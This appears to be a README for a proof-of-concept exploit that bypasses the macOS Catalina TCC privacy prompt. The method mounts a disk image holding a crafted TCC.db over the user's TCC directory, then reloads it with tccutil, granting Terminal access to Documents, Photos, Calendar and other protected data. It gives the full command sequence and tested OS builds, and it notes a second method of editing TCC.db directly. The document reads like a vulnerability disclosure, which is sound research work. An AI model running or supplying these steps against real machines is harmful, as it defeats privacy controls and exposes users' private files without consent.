# TCC prompt bypass

## Summary

An application can mount volumes at `~/Library/Application Support/com.apple.TCC`. This can be exploited by a malicious application to bypass TCC prompt by mounting a disk image containing `TCC.db` at `~/Library/Application Support/com.apple.TCC`.

## Demo

See file `demo.mov` containing the video demonstrating this exploit. To run this exploit, execute following commands 

1. Ensure `terminal` is not allowed to access `~/Documents` directory
   
   ```bash
   tccutil reset All com.apple.Terminal
   ls ~/Documents # Press Don't allow when TCC prompt is displayed
   ```
   
   The `ls` commands should fail with `Operation not permitted error`

2. Run `exploit.sh` to list files in `~/Documents`directory
   
   ```bash
   bash exploit.sh
   ```
   
   Running `exploit.sh` should output the list of files in `~/Documents` directory

## Impact

Malicious applications can bypass TCC prompt and access sensitive data like `Contacts`, `Photos`, `~/Documents` etc. normally protected by system.

## Exploitability

This exploit is tested to work on

1. Latest macOS Catalina stable release `10.15.3 (19D76)`

2. Latest macOS Catalina developer beta `10.15.4 Beta 3 (19E242d)`

**Note:** In macOS Catalina stable release `10.15.3 (19D76)`, an application can directly read and write `~/Library/Application Support/com.apple.TCC/TCC.db`. Hence a malicious application can bypass TCC by directly modifying database `TCC.db`. This is fixed on current macOS catalina developer beta version. But mounting volumes at `~/Library/Application Support/com.apple.TCC` still works in developer beta which is utilized by this exploit.

## Working

The `com.apple.TCC.dmg` disk image contains `TCC.db` which authorise following services for `Terminal` app

- kTCCServiceSystemPolicyDownloadsFolder

- kTCCServiceSystemPolicyDocumentsFolder

- kTCCServicePhotos

- kTCCServiceSystemPolicyDesktopFolder

- kTCCServiceCalendar

The following commands will mount the disk image `com.apple.TCC.dmg` at `~/Library/Application Support/com.apple.TCC`. This will override the `TCC.db` database with `TCC.db` in disk image 

1. Attach the APFS disk image using `hdiutil`
   
   ```bash
   hdiutil attach -nomount com.apple.TCC.dmg
   ```
   
   This should output will be similar to
   
   ```bash
   /dev/disk2              GUID_partition_scheme              
   /dev/disk2s1            Apple_APFS                         
   /dev/disk3              EF57347C-0000-11AA-AA11-0030654    
   /dev/disk3s1            41504653-0000-11AA-AA11-0030654    
   ```
   
   **Note**: In above example output, the partition in disk image where `TCC.db` is stored is attached to `/dev/disk3s1`. Replace `/dev/disk3s1` in below steps if you have a different output.

2. Mount the disk partition to `~/Library/Application Support/com.apple.TCC`
   
   ```bash
   mount_apfs /dev/disk3s1 ~/Library/Application\ Support/com.apple.TCC
   ```

3. Use `tccutil` to reload database `TCC.db`. This will load the database inside mounted volume
   
   ```bash
   tccutil reset AddressBook com.apple.Terminal
   ```

4. Access restricted `~/Documents` directory
   
   ```bash
   ls ~/Documents
   ```

5. *Optional*: Cleanup by unmounting and reloading `TCC.db`
   
   ```bash
   hdiutil detach -force /dev/disk3
   tccutil reset AddressBook com.apple.Terminal
   ```

## Change log

###### 28th February 2020

1. Initial release

###### 2nd March 2020

1. It is possible to mount volumes at non empty directories without `union` mount option. Thus `union` mount option is not required for this exploit to work. Updated title and sections "summary" and "working" to reflect this change
2. Tested and verified that this exploit works on latest macOS catalina beta release `10.15.4 Beta 3 (19E242d)`. Updated "exploitability" section to reflect this change
3. Added note in "exploitability" section mentioning another exploit method which works on current macOS catalina stable release `10.15.3 (19D76)` but is fixed on latest developer beta
